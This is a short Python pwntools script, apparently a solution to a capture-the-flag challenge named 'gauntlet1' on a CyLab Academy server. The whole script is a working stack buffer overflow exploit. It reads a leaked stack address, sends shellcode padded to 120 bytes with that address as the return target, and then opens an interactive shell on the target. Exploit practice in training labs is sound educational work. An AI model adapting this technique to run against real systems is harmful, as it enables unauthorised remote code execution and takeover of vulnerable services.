from pwn import *

context.log_level = "error"

elf = context.binary = ELF("./gauntlet1")
# p = process()

p = remote("chatelaine.cylabacademy.net", 47103)
p.sendline(b'OKE')
leak = p.recvline().strip().decode()
# print(leak)
stack_addr = int(leak,16)

shell = asm(shellcraft.sh())
jarak = 120
padd = b'a'*(jarak-len(shell))

pay = flat(
    shell,
    padd,
    stack_addr
)

p.sendline(pay)
p.interactive()
